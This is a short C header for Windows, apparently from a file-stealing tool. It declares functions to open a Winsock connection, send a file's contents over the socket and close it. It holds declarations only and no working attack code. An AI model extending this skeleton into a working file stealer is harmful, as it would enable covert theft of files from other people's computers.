#ifndef FILE_STEAL_H
#define FILE_STEAL_H

#include <windows.h>
#include <WinSock2.h>
#pragma comment(lib, "Ws2_32.lib")

void RandomInterupt();
int ConnectionEstablish(SOCKET *socket, struct sockaddr_in *socket_addr);
void FileSend(char *path, unsigned long long fileSize, SOCKET socket);
void ConnectionClose(SOCKET *socket);

#endif